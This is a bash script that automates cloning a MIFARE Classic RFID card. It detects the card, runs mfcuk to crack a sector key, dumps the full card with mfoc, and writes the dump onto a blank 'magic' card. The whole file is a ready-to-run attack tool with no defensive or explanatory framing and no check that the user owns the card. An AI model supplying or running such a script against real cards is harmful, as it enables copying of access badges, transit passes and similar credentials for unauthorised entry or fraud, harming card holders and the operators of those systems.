#!/bin/bash

set -e

ORIG_DUMP="original_dump.mfd"
KEYS_FILE="recovered_keys.mfd"
LOG="mfcuk.log"

echo "🔍 Looking for MIFARE Classic card..."
nfc-list | grep -q "SAK (SEL_RES): 08" || {
    echo "❌ No MIFARE Classic card found. Make sure the card is present and supported."
    exit 1
}

echo "🔑 Running mfcuk to discover vulnerable key..."
sudo mfcuk -C -R 0:A -v 3 -s 250 -S 250 -T 500 -k > "$LOG"

KEY_FOUND=$(grep "Found key A" "$LOG" | awk '{print $4}' | head -n1)

if [[ -z "$KEY_FOUND" ]]; then
    echo "❌ Failed to discover a key. Try moving the card or using a different sector."
    exit 1
fi

echo "✅ Key found: $KEY_FOUND"

echo "💾 Dumping full card using mfoc..."
sudo mfoc -k "$KEY_FOUND" -O "$ORIG_DUMP"

echo "✅ Dumped to $ORIG_DUMP"

read -p "📥 Insert blank MIFARE Classic (magic) card and press Enter to continue..."

echo "✏️ Writing dump to new card..."
sudo nfc-mfclassic W a u "$ORIG_DUMP"

echo "✅ Clone complete!"



